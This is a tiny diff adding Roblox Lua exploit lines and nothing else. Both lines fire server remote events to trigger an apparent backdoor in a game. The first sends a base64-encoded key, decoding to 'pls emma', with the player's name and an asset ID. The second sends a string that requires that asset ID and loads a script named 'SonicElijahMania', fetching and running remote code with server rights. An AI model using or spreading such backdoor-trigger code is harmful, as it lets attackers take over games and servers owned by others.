@@ -1,0 +1,4 @@
+game.ReplicatedStorage.mynameemma.emma:FireServer('cGxzIGVtbWE=',game:GetService'Players'.LocalPlayer.Name,1192815372)
+game.ReplicatedStorage.RemoteEvent:FireServer([[require(1192815372).load"SonicElijahMania"]])
+
+1192815372
